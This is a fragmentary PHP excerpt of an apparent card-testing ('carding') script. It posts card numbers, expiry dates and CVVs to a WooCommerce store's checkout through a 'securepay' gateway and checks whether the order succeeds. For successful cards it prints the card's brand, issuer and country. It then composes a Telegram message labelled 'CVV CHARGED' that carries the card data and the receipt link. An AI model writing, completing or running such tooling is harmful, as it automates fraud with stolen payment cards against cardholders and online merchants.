...
$paymentMethods = [
    ...
    'woocommerce_securepay_p_gateway_pro' => '/<input[^>]*name="payment_method"[^>]*value="woocommerce_securepay_p_gateway_pro"/'
    ];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'billing_phone' => $phone,
    'billing_email' => $email,
    'account_username' => $lname,
    'account_password' => $country,
    'shipping_first_name' => '',
    'shipping_last_name' => '',
    'shipping_company' => '',
    'shipping_country' => '',
...
//     'anz_egate-card-cvc' =>  $cvv,
    //'cod-card-holder' => 'Senn Sui',
    'ccardNumber' => $cc,
    'exyear' => $ano_no_20,
    'exmonth' => $mes_with_zero,
    'ccvv' => $cvv,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED WCSECUREPRO]
    \n[$hostname1]
    \n[$receiptUrl]\n";
